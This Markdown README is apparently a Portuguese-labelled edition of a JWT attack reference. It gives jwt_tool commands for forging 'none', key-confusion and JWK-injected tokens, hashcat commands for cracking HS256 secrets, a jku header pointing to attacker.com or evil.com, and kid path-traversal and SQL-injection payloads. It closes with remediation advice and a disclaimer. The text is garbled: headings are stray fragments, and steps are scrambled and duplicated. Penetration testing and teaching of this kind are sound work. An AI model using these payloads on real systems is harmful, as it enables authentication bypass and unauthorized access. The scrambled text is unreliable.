# 🎟️ JWT-Attacks — Guia de referência completo

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)



```
       ██╗██╗    ██╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗
       ██║██║    ██║╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝
       ██║██║ █╗ ██║   ██║       ███████║   ██║      ██║   ███████║██║     █████═╝ ███████╗
  ██   ██║██║███╗██║   ██║       ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║
  ╚█████╔╝╚███╔███╔╝   ██║       ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║
   ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
             JSON Web Token Exploitation & Security Testing Guide
```

<p align="center">
  <img src="https://img.shields.io/badge/JWT-Attacks-orange?style=for-the-badge" alt="JWT Attacks">
  <img src="https://img.shields.io/badge/jwt_tool-Automated_Testing-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="Key Attacks">
  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="API Testing">
</p>

<p align="center">
  <b>🛡️ Comprehensive methodology and practical commands for exploiting JSON Web Token (JWT) vulnerabilities</b>
</p>

---

## 📋 Índice

- [Introdução](#-introduction--anatomy-of-a-jwt)
- [Essential Testing Tools](#-essential-testing-tools)
- [Vulnerability Matrix & Attack Vectors](#-vulnerability-matrix--attack-vectors)
  - [1. None Algorithm Flaw (`alg: "none"`)](#1-none-algorithm-flaw-alg-none)
  - [2. Weak HMAC Secret Cracking (HS256)](#2-weak-hmac-secret-cracking-hs256)
  - [3. Algorithm Confusion / Key Confusion (RS256 -> HS256)](#3-algorithm-confusion--key-confusion-rs256---hs256)
  - [4. JWK (JSON Web Key) Header Injection](#4-jwk-json-web-key-header-injection)
  - [3. Sign the token with your matching private key.](#5-jku-jwk-set-url-misconfiguration--ssrf)
  - [> - `https://trusted.com@attacker.com/jwks.json`](#6-kid-key-id-header-manipulation--injections)
  - [Inject a known static string:](#7-cross-service-relaying--sensitive-data-leakage)
- [Automating Tests with `jwt_tool`](#-automating-tests-with-jwt_tool)
- [Cracking JWT Secrets with Hashcat](#-cracking-jwt-secrets-with-hashcat)
- [Referência rápida](#-quick-reference-table)
- [Remediation & Secure Implementation](#-remediation--secure-implementation)
- [Legal Disclaimer](#-legal-disclaimer)
- [Recursos e referências](#-resources)

---

## 🎯 Introdução

A **JSON Web Token (JWT)** is a compact, URL-safe means of representing claims between two parties. Commonly used for session authentication in modern REST APIs, Single Page Applications (SPAs), and microservices.

A standard JWT consists of three Base64URL-encoded parts separated by dots (`.`):

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoidXNlciJ9.4z7kE8l...
[------------- HEADER -------------].[-------------- PAYLOAD --------------].[----------- SIGNATURE -----------]
```

1. **Header:** Identifies the token type and the cryptographic algorithm used (e.g., `HS256`, `RS256`, `none`).
2. **Payload:** Contains the claims (e.g., `user_id`, `role`, expiration `exp`). *Note: Payloads are encoded, NOT encrypted!*
A standard JWT consists of three Base64URL-encoded parts separated by dots (`.`):

---

## 🛠️ Essential Testing Tools

3. **Signature:** Created by hashing the encoded Header and Payload using a secret key or private key.
2. **Hashcat:** Fast GPU-based HMAC secret cracking (Mode `16500`).
3. **Burp Suite Extension:** "JWT Editor" by Fraser Winterborn (in PortSwigger BApp Store).

### 🛠️ Essential Testing Tools

```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 -m pip install -r requirements.txt
alias jwt_tool='python3 /opt/jwt_tool/jwt_tool.py'
```

---

## 💥 Vulnerability Matrix & Attack Vectors

### 1. None Algorithm Flaw (`alg: "none"`)

**Mechanism:**
Some JWT verification libraries consider tokens valid if the `alg` header is set to `none`, completely bypassing signature verification.

**Exploitation:**
1. None Algorithm Flaw (`alg: "none"`)
2. Modify payload claims (e.g., `"role": "admin"`).
Mechanism:

```bash
# Using jwt_tool to forge 'none' algorithm token
python3 jwt_tool.py <TOKEN> -X a

# Test various casing variations (none, None, NONE, nOnE)
python3 jwt_tool.py <TOKEN> -T -S none
```

*Manual Token Structure:*
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
```

---

### 2. Weak HMAC Secret Cracking (HS256)

**Mechanism:**
If the server signs tokens using symmetric algorithms (`HS256`, `HS384`, `HS512`) with a guessable or weak secret key (e.g., `secret`, `admin123`, company name), an attacker can brute-force the secret offline and sign arbitrary tokens.

**Cracking with Hashcat:**
```bash
# Save the full JWT to a file
echo "eyJhbGciOi..." > jwt.txt

# Crack using Hashcat Mode 16500 (JWT Secret)
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
```

**Forging Token After Cracking:**
```bash
python3 jwt_tool.py <TOKEN> -T -S hs256 -p 'discovered_secret'
```

---

### 3. Algorithm Confusion / Key Confusion (RS256 -> HS256)

**Mechanism:**
- **RS256 (Asymmetric)**: Signed with the server's private key; verified with the server's **public key**.
- **HS256 (Symmetric)**: Signed and verified with the **same shared secret**.

3. Algorithm Confusion / Key Confusion (RS256 -> HS256)
1. Obtain the server's public key (often publicly exposed at `/.well-known/jwks.json` or certificates).
Mechanism:
RS256 (Asymmetric)**: Signed with the server's private key; verified with the server's **public key**.
4. The server receives the token, sees `HS256`, and verifies the signature using its configured verification key (which is its public key), resulting in a valid signature!

**Exploitation via `jwt_tool`:**
```bash
# Supply the server's public key and perform key confusion
python3 jwt_tool.py <TOKEN> -X k -pk public.pem
```

---

### 4. JWK (JSON Web Key) Header Injection

**Mechanism:**
The JWT specification allows an embedded public key in the `jwk` header parameter. Vulnerable servers trust this header key to verify the signature without checking if the key belongs to a trusted CA or pre-shared whitelist.

**Exploitation:**
4. JWK (JSON Web Key) Header Injection
2. Embed the public key in the `jwk` header.
Mechanism:

```bash
# Inject self-signed key in header using jwt_tool
python3 jwt_tool.py <TOKEN> -X i
```

---

### 3. Sign the token with your matching private key.

**Mechanism:**
The `jku` (JWK Set URL) header specifies a remote URL from which the server should fetch the public key set to verify the token.

**Exploitation:**
5. JKU (JWK Set URL) Misconfiguration & SSRF
   ```json
   {
     "keys": [
       {
         "kty": "RSA",
         "e": "AQAB",
         "use": "sig",
         "kid": "attacker-key",
         "n": "..."
       }
     ]
   }
   ```
Mechanism:
   ```json
   {
     "alg": "RS256",
     "typ": "JWT",
     "jku": "http://attacker.com/jwks.json",
     "kid": "attacker-key"
   }
   ```
3. Sign the token with your private key.

> **Bypassing URL Whitelists:**
> If the application validates domain endings, test open redirects or URL parsing quirks:
2. Modify the token header:
> - `https://trusted.com.attacker.com/jwks.json`
3. Sign the token with your private key.

---

### > - `https://trusted.com@attacker.com/jwks.json`

> - Open redirect: `https://trusted.com/redirect?url=http://attacker.com/jwks.json`

#### A. Directory Traversal to Empty File (`/dev/null`)
If the server reads the key file from disk using `kid`:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "/dev/null"
}
```
Sign the token with an empty secret (`""` / 0 bytes)!

#### B. SQL Injection via KID
A. Directory Traversal to Empty File (`/dev/null`)
```sql
SELECT secret FROM keys WHERE kid = 'INPUT';
```
Inject a known static string:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key' UNION SELECT 'my_known_secret'-- -"
}
```
Sign the token using the secret `'my_known_secret'`.

---

### Inject a known static string:

- **Unencrypted PII**: Developers frequently store passwords, SSNs, or sensitive user metadata in the payload, forgetting it is only Base64URL-encoded, not encrypted.
- **Service Confusion**: Using a token meant for a low-privilege service (e.g., analytics API) against an internal administrative API.

---

## ⚡ Automating Tests with `jwt_tool`

### Service Confusion**: Using a token meant for a low-privilege service (e.g., analytics API) against an internal administrative API.
The easiest way to scan for all known vulnerabilities automatically:

```bash
# Launch full automated playbook scan
python3 jwt_tool.py <TOKEN> -M pb -t https://target.com/api/user -rh "Authorization: Bearer <TOKEN>"
```

### Interactive Tampering Mode
```bash
# Interactively edit header or payload claims
python3 jwt_tool.py <TOKEN> -T
```

---

## 🔓 Cracking JWT Secrets with Hashcat

```bash
# 1. Format: Put token alone in a file
echo "eyJhbGciOiJIUzI1NiIsInR5..." > jwt.txt

# 2. Dictionary attack using rockyou
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -w 3

# 3. Rule-based attack
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## 📊 Referência rápida

|Vulnerability|Attack Technique|Key Payload / Flag|
|---------------|------------------|--------------------|
|**None Algorithm**|Set `alg: "none"`, strip signature|`jwt_tool <TOKEN> -X a`|
|**Weak Secret**|GPU dictionary brute-force|`hashcat -m 16500 jwt.txt rockyou.txt`|
|**Algorithm Confusion**|Change RS256 to HS256, sign with public key|`jwt_tool <TOKEN> -X k -pk pub.pem`|
|**JWK Injection**|Embed attacker public key in header|`jwt_tool <TOKEN> -X i`|
|**JKU Injection**|Point `jku` to external server|`"jku": "http://evil.com/jwks.json"`|
|**KID Path Traversal**|Point `kid` to `/dev/null` or known file|`"kid": "/dev/null"` (Sign with `""`)|
|**KID SQLi**|Inject static secret into SQL query|`"kid": "' UNION SELECT 'secret'-- -"`|

---

## 🛡️ Remediation & Secure Implementation

1. **Explicitly Whitelist Algorithms:**
   Never allow client-controlled `alg` selection. Hardcode allowed algorithms on the server (e.g., exclusively allow `RS256`).
2. **Reject `alg: none` Tokens:**
   Ensure the library strictly rejects unverified or unsigned tokens.
3. **Use Long, Cryptographically Secure Secrets:**
   HMAC secrets must be at least 256 bits (32+ random characters) generated by a secure CSPRNG.
4. **Validate `jku` and `jwk` Headers:**
Never allow client-controlled `alg` selection. Hardcode allowed algorithms on the server (e.g., exclusively allow `RS256`).
5. **Sanitize `kid` Values:**
Ensure the library strictly rejects unverified or unsigned tokens.

---

## ⚠️ Legal Disclaimer

> **IMPORTANT:** JWT attacks can lead to full authentication bypass and unauthorized access to application databases. This guide is strictly intended for educational purposes and authorized penetration testing.

---

## 📚 Recursos e referências

- [jwt_tool GitHub Repository](https://github.com/ticarpi/jwt_tool)
- [PortSwigger Web Security Academy: JWT Attacks](https://portswigger.net/web-security/jwt)
- [RFC 7519 - JSON Web Token (JWT) Standard](https://datatracker.ietf.org/doc/html/rfc7519)
